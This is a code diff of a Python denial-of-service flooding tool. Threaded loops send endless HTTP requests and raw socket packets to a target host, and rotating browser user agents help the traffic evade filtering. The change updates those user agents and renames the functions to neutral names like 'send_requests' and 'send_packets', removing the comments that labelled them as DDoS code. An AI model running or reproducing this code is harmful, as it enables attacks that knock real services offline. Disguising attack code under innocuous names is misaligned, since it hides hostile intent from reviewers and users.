@@ -44,24 +44,19 @@ def print_banner():
 # User agents for requests
 def user_agent():
     uagent = [
-        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
-        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
-        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
-        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
-        "Mozilla/5.0 (Linux; rv:81.0) Gecko/20100101 Firefox/81.0",
-        "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
-        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:81.0) Gecko/20100101 Firefox/81.0",
-        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
-        "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/604.1",
+        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
     ]
     return uagent
 
@@ -74,24 +69,26 @@ def validators():
     ]
     return vals
 
-# Bot rippering function
-def bot_rippering(url, uagent_list):
+def send_requests(url, uagent_list):
     try:
         while True:
-            req = urllib.request.urlopen(
-                urllib.request.Request(
-                    url,
-                    headers={'User-Agent': random.choice(uagent_list)}
-                )
+            user_agent = random.choice(uagent_list)
+            request = urllib.request.Request(
+                url=url,
+                headers={"User-Agent": user_agent}
             )
-            logging.info(f"{Colors.MAGENTA}bot is rippering...{Colors.ENDC}")
-            time.sleep(random.uniform(0.1, 0.5))
-    except Exception as e:
-        logging.error(f"{Colors.RED}Bot rippering error: {e}{Colors.ENDC}")
+
+            urllib.request.urlopen(request)
+
+            logging.info(f"{Colors.MAGENTA}sending requests...{Colors.ENDC}")
+            delay = random.uniform(0.1, 0.5)
+            time.sleep(delay)
+    except Exception as err:
+        logging.error(f"{Colors.RED}request error: {err}{Colors.ENDC}")
         time.sleep(0.1)
 
-# Direct socket connection DDOS
-def down_it(host, port, uagent_list, data):
+
+def send_packets(host, port, uagent_list, data):
     try:
         while True:
             packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent_list) + "\n" + data).encode('utf-8')
@@ -101,7 +98,7 @@ def down_it(host, port, uagent_list, data):
             if s.sendto(packet, (host, int(port))):
                 s.shutdown(1)
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                logging.info(f"{Colors.GREEN}{timestamp}{Colors.ENDC} {Colors.GREEN} <--packet sent! rippering--> {Colors.ENDC}")
+                logging.info(f"{Colors.GREEN}{timestamp}{Colors.ENDC} {Colors.GREEN} <--packet sent! requesting-->{Colors.ENDC}")
             else:
                 s.shutdown(1)
                 logging.error(f"{Colors.RED}shut<->down{Colors.ENDC}")
@@ -110,22 +107,20 @@ def down_it(host, port, uagent_list, data):
         logging.error(f"{Colors.RED}no connection! web server maybe down! {e}{Colors.ENDC}")
         time.sleep(0.1)
     except Exception as e:
-        logging.error(f"{Colors.RED}Unexpected error in down_it: {e}{Colors.ENDC}")
+        logging.error(f"{Colors.RED}Unexpected error in send_packets: {e}{Colors.ENDC}")
         time.sleep(0.1)
 
-# Threaded DDOS function
 def dos_thread(host, port, uagent_list, data, thread_id):
     try:
         while True:
-            down_it(host, port, uagent_list, data)
+            send_packets(host, port, uagent_list, data)
     except Exception as e:
         logging.error(f"{Colors.RED}Thread {thread_id} error: {e}{Colors.ENDC}")
 
-# Threaded validator function
 def validator_thread(url, uagent_list, thread_id):
     try:
         while True:
-            bot_rippering(url, uagent_list)
+            send_requests(url, uagent_list)
     except Exception as e:
         logging.error(f"{Colors.RED}Validator thread {thread_id} error: {e}{Colors.ENDC}")
 
@@ -134,7 +129,6 @@ def signal_handler(sig, frame):
     print(f'\n{Colors.YELLOW}Received SIGINT, shutting down gracefully...{Colors.ENDC}')
     sys.exit(0)
 
-# Main function
 def main():
     print_banner()
 
